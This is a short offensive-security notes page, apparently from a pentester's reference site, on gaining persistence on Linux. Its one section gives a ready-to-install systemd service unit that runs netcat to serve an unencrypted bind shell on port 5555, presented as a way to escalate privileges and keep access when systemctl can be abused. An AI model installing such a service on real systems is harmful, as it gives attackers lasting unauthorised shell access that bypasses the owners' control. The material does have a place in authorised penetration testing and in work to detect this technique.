---
title: "Persistance"
---

<p style="text-align: right">_- last update 09/08/2022 -_</p>

_Incomming..._
## Linux

### Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance. It starts a service serving a **non encrypted** shell on the given port.

```txt
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```

